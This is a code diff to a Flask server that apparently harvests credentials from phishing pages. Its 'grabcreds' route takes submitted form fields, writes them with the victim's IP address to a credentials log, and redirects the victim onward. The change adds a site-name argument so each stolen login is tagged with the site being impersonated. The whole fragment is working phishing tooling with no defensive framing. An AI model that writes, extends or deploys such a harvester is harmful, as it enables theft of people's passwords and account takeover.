@@ -8,6 +8,7 @@ app = Flask(__name__)
 redirect_url = argv[1]
 host = argv[2]
 port = int(argv[3])
+sitename = argv[4]
 
 def address(): #use our own function just in case the flask server is being hosted behind a proxy
     """
@@ -36,7 +37,7 @@ def passwd():
 def grabcreds():
     data = request.form.to_dict(flat=False)
     with open("credentials.log", "a") as file:
-        file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]} : {address()} \n")
+        file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]} : {address()} : {sitename}\n")
     return redirect(redirect_url)
 
 
